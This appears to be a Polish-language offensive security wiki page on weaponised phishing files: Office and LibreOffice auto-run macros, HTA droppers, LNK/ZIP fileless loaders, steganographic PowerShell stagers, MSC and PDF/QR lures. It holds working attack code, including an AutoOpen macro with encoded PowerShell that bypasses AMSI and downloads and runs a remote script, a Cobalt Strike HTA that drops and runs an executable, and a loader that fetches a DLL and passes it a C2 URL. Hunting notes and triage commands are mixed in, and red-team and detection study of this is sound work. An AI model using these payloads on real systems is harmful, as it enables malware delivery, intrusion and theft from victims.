# Pliki i dokumenty phishingowe

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word przeprowadza walidację danych pliku przed jego otwarciem. Walidacja danych odbywa się w formie identyfikacji struktury danych zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi błąd, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Możliwe jest jednak zmienienie nazwy pliku poprzez zmianę rozszerzenia i zachowanie możliwości wykonywania makr.\
Na przykład plik RTF z założenia nie obsługuje makr, ale plik DOCM ze zmienionym rozszerzeniem na RTF zostanie obsłużony przez Microsoft Word i będzie umożliwiał wykonywanie makr.\
Te same mechanizmy wewnętrzne mają zastosowanie do całego oprogramowania pakietu Microsoft Office (Excel, PowerPoint itd.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy pakietu Office:
```bash
assoc | findstr /i "word excel powerp"
```
Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go), który zawiera macros, również mogą „uruchamiać” macros.

### Ładowanie zewnętrznego obrazu

Przejdź do: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture oraz **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Ładowanie zewnętrznego obrazu: przejdź do: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor macros

Możliwe jest użycie macros do uruchamiania dowolnego kodu z dokumentu.

#### Funkcje automatycznego ładowania

Im częściej są używane, tym większe prawdopodobieństwo, że AV je wykryje.

- AutoOpen()
- Document_Open()

#### Przykłady kodu macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ręczne usuwanie metadanych

Przejdź do **Plik > Informacje > Inspekcja dokumentu > Inspekcja dokumentu**, aby otworzyć Inspektora dokumentów. Kliknij **Inspekcja**, a następnie **Usuń wszystko** obok pozycji **Właściwości dokumentu i informacje osobiste**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz menu rozwijane **Zapisz jako typ** i zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
Zrób to, ponieważ **nie można zapisywać makr w pliku `.docx`**, a rozszerzenie obsługujące makra **`.docm`** ma **negatywne skojarzenia** (np. ikona miniatury zawiera ogromny znak `!`, a niektóre bramki webowe/e-mail całkowicie je blokują). Dlatego to **starsze rozszerzenie `.doc` jest najlepszym kompromisem**.

#### Generatory złośliwych makr

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Automatycznie uruchamiane makra LibreOffice ODT (Basic)

Dokumenty LibreOffice Writer mogą zawierać makra Basic i automatycznie wykonywać je po otwarciu pliku przez powiązanie makra ze zdarzeniem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Proste makro reverse shell wygląda następująco:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Zwróć uwagę na podwójne cudzysłowy (`""`) wewnątrz ciągu znaków – LibreOffice Basic używa ich do escapu literalnych cudzysłowów, dlatego payloady kończące się na `...==""")` zachowują poprawne zbalansowanie zarówno wewnętrznej komendy, jak i argumentu Shell.

Wskazówki dotyczące dostarczenia:

- Zapisz plik jako `.odt` i przypisz makro do zdarzenia dokumentu, aby zostało uruchomione natychmiast po jego otwarciu.
- W przypadku wysyłania wiadomości e-mail za pomocą `swaks` użyj `--attach @resume.odt` (`@` jest wymagane, aby jako załącznik zostały wysłane bajty pliku, a nie ciąg znaków zawierający jego nazwę). Ma to kluczowe znaczenie podczas nadużywania serwerów SMTP, które akceptują dowolnych odbiorców `RCPT TO` bez walidacji.

## Pliki HTA

HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i wykonuje się jako aplikacja z „pełnym zaufaniem”, bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA jest uruchamiany za pomocą **`mshta.exe`**, który jest zazwyczaj **instalowany** wraz z **Internet Explorerem**, przez co **`mshta` zależy od IE**. Jeśli więc Internet Explorer został odinstalowany, HTA nie będzie można uruchomić.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów na **zdalne wymuszenie uwierzytelniania NTLM**, na przykład można dodać **niewidoczne obrazy** do wiadomości e-mail lub kodu HTML, do którego użytkownik uzyska dostęp (nawet przez HTTP MitM?). Można też wysłać ofierze **adresy plików**, które **wywołają** **uwierzytelnianie** już przy **otwieraniu folderu**.

**Sprawdź te i inne pomysły na następujących stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Pamiętaj, że możesz nie tylko wykraść hash lub dane uwierzytelniające, ale także **wykonywać ataki NTLM relay**:

- [**Ataki NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay do certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Wysoce skuteczne kampanie dostarczają archiwum ZIP zawierające dwa legalne dokumenty-wabiki (PDF/DOCX) oraz złośliwy plik .lnk. Sztuczka polega na tym, że właściwy PowerShell loader jest przechowywany w nieprzetworzonych bajtach ZIP-a, za unikalnym znacznikiem, a plik .lnk wycina go i uruchamia w całości w pamięci.<sup>[[2]](#references)</sup>

Typowy przebieg zaimplementowany jako PowerShell one-liner w pliku .lnk:

1) Zlokalizuj oryginalne archiwum ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz w katalogu nadrzędnym bieżącego katalogu roboczego.
2) Odczytaj bajty ZIP-a i znajdź hardcoded marker (np. xFIQCV). Wszystko po tym znaczniku jest osadzonym PowerShell payloadem.
3) Skopiuj ZIP do %ProgramData%, wypakuj go w tym miejscu i otwórz dokument-wabik .docx, aby wyglądać wiarygodnie.
4) Omiń AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Usuń obfuskację z kolejnego etapu (np. usuń wszystkie znaki #) i wykonaj go w pamięci.

Przykładowy szkielet PowerShell do wycięcia i uruchomienia osadzonego etapu:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notatki
- Dostarczanie często wykorzystuje subdomeny renomowanych PaaS (np. *.herokuapp.com) i może filtrować payloady (serwować nieszkodliwe archiwa ZIP na podstawie adresu IP/UA).
- Kolejny etap często odszyfrowuje zakodowany w base64/XOR shellcode i wykonuje go za pomocą Reflection.Emit + VirtualAlloc, aby ograniczyć artefakty na dysku.

Persistence używane w tym samym łańcuchu
- Przejęcie COM TypeLib kontrolki Microsoft Web Browser, dzięki czemu IE/Explorer lub dowolna aplikacja osadzająca tę kontrolkę automatycznie ponownie uruchamia payload.<sup>[[2]](#references)[[4]](#references)</sup> Szczegóły i gotowe do użycia polecenia znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Polowanie/IOC
- Pliki ZIP zawierające marker ASCII (np. xFIQCV) dołączony na końcu danych archiwum.
- Plik .lnk, który wylicza foldery nadrzędne/użytkownika w celu odnalezienia pliku ZIP i otwiera dokument-wabik.
- Manipulowanie AMSI za pomocą [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długotrwałe wątki biznesowe kończące się linkami hostowanymi w zaufanych domenach PaaS.

## Etapowanie LNK z otwarciem wabika w pierwszej kolejności → persistence za pomocą zaplanowanego zadania → trusted CPL side-loading

Kolejnym powtarzającym się wzorcem jest **plik `.lnk` podszywający się pod dokument**, który natychmiast otwiera nieszkodliwy wabik, jednocześnie w tle przygotowując rzeczywisty łańcuch.<sup>[[3]](#references)</sup>

Zaobserwowany przebieg:
1. Skrót **podszywa się pod plik PDF** i używa `conhost.exe` lub podobnego proxy do uruchomienia zaciemnionego downloadera PowerShell.
2. PowerShell dzieli oczywiste tokeny (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), dzięki czemu proste mechanizmy detekcji szukające `iwr`, `gci`, `ren`, `cpi` lub `schtasks` nie wykrywają polecenia.
3. Stager najpierw pobiera **dokument-wabik**, otwiera go przed ofiarą, a następnie w tle odtwarza złośliwe pliki.
4. Payloady mogą być zapisywane z **fałszywymi rozszerzeniami**, a następnie przemianowywane przez usunięcie znaków wypełniających, co opóźnia pojawienie się oczywistych artefaktów `.exe` / `.cpl`.
5. Persistence jest ustanawiane za pomocą **zaplanowanego zadania uruchamianego co minutę**, które startuje zaufany plik binarny hosta ze ścieżki zapisywalnej przez użytkownika.

Minimalne wskazówki huntingowe dotyczące tego wzorca:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Przydatny układ stagingu do rozpoznania:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` lub `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Dlaczego drugi etap jest trudny do wykrycia

W analizie przypadku Rapid7 zaplanowane zadanie wielokrotnie uruchamiało **`Fondue.exe`** z `C:\Users\Public\`. Ponieważ obok niego umieszczono **`APPWIZ.cpl`**, eksportujący **`RunFODW`**, zaufany plik binarny Microsoft ładował bocznie CPL atakującego zamiast prawidłowej kopii systemowej.

CPL następnie:
- Odczytuje blob **AES-256-CBC** z `C:\Windows\Tasks\editor.dat`
- Odszyfrowuje go za pomocą **Windows CNG / `bcrypt.dll`**
- Alokuje pamięć wykonywalną i kopiuje do niej odszyfrowany shellcode
- Uruchamia go pośrednio, przekazując wskaźnik shellcode'u jako callback dla **`EnumUILanguagesW`**

Ten ostatni etap warto wykrywać osobno: malware często unika bezpośredniego skoku `((void(*)())buf)()` i zamiast tego nadużywa **legitimate callback-taking WinAPI**, aby przekazać wykonanie.

Odszyfrowanym payloadem w tej kampanii był shellcode **Donut**, który następnie załadował końcowy PE w całości do pamięci i spatchował **AMSI/WLDP/ETW** w bieżącym procesie przed przekazaniem wykonania. Bardziej szczegółowe informacje o side-loadingu i przetwarzaniu post-processing w pamięci znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktyczne punkty odniesienia podczas wykrywania:
- `.lnk` uruchamiający `powershell.exe` lub `conhost.exe`, a następnie widoczny dokument-przynęta.
- Krótkotrwałe pobrania do **`C:\Users\Public\`**, po których natychmiast następują zmiany nazw z użyciem nonsensownych rozszerzeń.
- Zaplanowane zadania o niepozornych nazwach, takich jak `GoogleErrorReport`, uruchamiające pliki z **katalogów zapisywalnych przez użytkownika**.
- Zaufane pliki binarne ładujące pliki **`.cpl` / `.dll`** z tego samego katalogu niesystemowego.
- Bloby tekstowe Base64 zapisywane w **`C:\Windows\Tasks\`**, a następnie odczytywane przez moduł załadowany bocznie.

## Payloady ograniczone steganograficznie w obrazach (PowerShell stager)

Nowsze łańcuchy loaderów dostarczają obfuskowany JavaScript/VBS, który dekoduje i uruchamia PowerShell stager w formacie Base64. Ten stager pobiera obraz (często GIF) zawierający zakodowany w Base64 plik .NET DLL ukryty jako zwykły tekst pomiędzy unikalnymi znacznikami początku i końca. Skrypt wyszukuje te delimitery (przykłady zaobserwowane w środowisku naturalnym: «<<sudo_png>> … <<sudo_odt>>>»), wyodrębnia tekst znajdujący się pomiędzy nimi, dekoduje go z Base64 do bajtów, ładuje assembly do pamięci i wywołuje znaną metodę wejściową z adresem URL C2.<sup>[[5]](#references)</sup>

Przepływ pracy
- Etap 1: Zarchiwizowany dropper JS/VBS → dekoduje osadzony Base64 → uruchamia PowerShell stager z parametrami -nop -w hidden -ep bypass.
- Etap 2: PowerShell stager → pobiera obraz, wycina Base64 ograniczony znacznikami, ładuje .NET DLL do pamięci i wywołuje jego metodę (np. VAI), przekazując adres URL C2 oraz opcje.
- Etap 3: Loader pobiera końcowy payload i zazwyczaj wstrzykuje go za pomocą process hollowing do zaufanego pliku binarnego (często MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Więcej informacji o process hollowing i trusted utility proxy execution znajdziesz tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Przykład PowerShell wycinający DLL z obrazu i wywołujący metodę .NET w pamięci:

<details>
<summary>Ekstraktor i loader PowerShell stego payloadu</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Uwagi
- To jest ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markery różnią się między kampaniami.
- AMSI/ETW bypass oraz string deobfuscation są powszechnie stosowane przed załadowaniem assembly.
- Hunting: skanuj pobrane obrazy w poszukiwaniu znanych delimiterów; identyfikuj PowerShell uzyskujący dostęp do obrazów i natychmiast dekodujący bloby Base64.

Zobacz także narzędzia stego i techniki carvingu:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Powtarzającym się initial stage jest mały, silnie obfuscated plik `.js` lub `.vbs` dostarczony w archiwum. Jego jedynym celem jest zdekodowanie osadzonego stringu Base64 i uruchomienie PowerShell z `-nop -w hidden -ep bypass`, aby zainicjować pobranie next stage przez HTTPS.<sup>[[5]](#references)</sup>

Logika szkieletowa (abstrakcyjna):
- Odczytaj zawartość własnego pliku
- Zlokalizuj blob Base64 między losowymi stringami
- Zdekoduj do PowerShell w formacie ASCII
- Wykonaj za pomocą `wscript.exe`/`cscript.exe`, wywołując `powershell.exe`

Wskazówki do huntingu
- Załączniki JS/VBS w archiwach uruchamiające `powershell.exe` z `-enc`/`FromBase64String` w command line.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` ze ścieżek tymczasowych użytkownika.

## Dokumenty MSC jako kontenery wykonawcze (GrimResource)

Pliki Microsoft Management Console (`.msc`) to definicje konsol XML, które są zwykle otwierane przez `mmc.exe`. **GrimResource** wykorzystuje referencję `StringTable` do zasobu `apds.dll` zawierającego stary XSS primitive, dzięki czemu otwarcie spreparowanej konsoli przez użytkownika powoduje uruchomienie JavaScript wewnątrz `mmc.exe`. Zaobserwowane samples łączyły obfuscation oparte na `transformNode` z **DotNetToJScript**, aby utworzyć .NET payload bez typowej ścieżki Office-macro.<sup>[[9]](#references)</sup>

W przypadku static triage traktuj niezaufany plik MSC jako tekst i **nie klikaj go dwukrotnie**:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
Wysoko sygnałowe pivots runtime obejmują `mmc.exe` ładujące CLR lub komponenty skryptowe, tworzące połączenia sieciowe albo uruchamiające `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` lub nieoczekiwany plik wykonywalny. Ten format jest legalny, dlatego detekcje powinny korelować **źródło + podejrzaną zawartość XML/skryptu + zachowanie `mmc.exe`**, zamiast blokować każdy plik MSC.<sup>[[9]](#references)</sup>

## PDF/QR redirectory i bramkowanie payloadu

PDF nie musi wykorzystywać exploita, aby być przydatny. W najnowszych kampaniach umieszczano **kod QR lub zwykły link** w dokumencie wyglądającym na nieszkodliwy, przenoszono sesję przeglądarki poza kontrolę poczty i personalizowano miejsce docelowe za pomocą adresu odbiorcy. Firma Microsoft opisała w 2025 roku pliki PDF, których adresy URL kodów QR były unikalne dla poszczególnych odbiorców i prowadziły do infrastruktury RaccoonO365 służącej do kradzieży poświadczeń; równoległy łańcuch wykorzystywał filtrowanie na podstawie adresu IP i środowiska, aby zwracać wybranym użytkownikom ścieżkę JavaScript/MSI, a skanerom lub niedozwolonym klientom nieszkodliwy plik PDF.<sup>[[10]](#references)</sup>

Analizuj zarówno akcje PDF, jak i wyrenderowane kody QR. Kod QR może być narysowany jako grafika wektorowa, a nie zapisany jako obraz możliwy do wyodrębnienia, dlatego rasteryzuj każdą stronę oraz wyodrębniaj osadzone obrazy:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
Przeanalizuj zdekodowane adresy docelowe i przekierowania z odizolowanego systemu analitycznego bez uwierzytelniania. Przydatne cechy do threat huntingu obejmują pliki PDF zawierające wyłącznie kod QR z niemal pustą treścią wiadomości, adres e-mail odbiorcy umieszczony w parametrze zapytania, kilka przekierowań za pośrednictwem renomowanych usług hostingowych oraz różne treści zwracane w zależności od adresu IP, geolokalizacji, cookies, referrera lub user agenta. Porównuj żądania przy użyciu kontrolowanych profili, ponieważ pojedyncze pobranie z sandboxa może zwrócić wyłącznie wabik.<sup>[[10]](#references)</sup>

## Pliki Windows do kradzieży hashy NTLM

Sprawdź stronę o **miejscach kradzieży poświadczeń NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Makro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Badania Check Point – kampania ZipLine: wyrafinowany phishing wymierzony w firmy z USA](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: śledzenie tradecraftu Dropping Elephant w łańcuchu loadera z motywem Chin](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Przejęcie TypeLib – nowa technika persystencji COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – loader PhantomVAI dostarcza szereg infostealerów](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografia (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – wykonywanie za pośrednictwem proxy zaufanych narzędzi deweloperskich: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console jako metoda initial access i evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – threat actors wykorzystują sezon podatkowy do wdrażania kampanii phishingowych związanych z podatkami](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
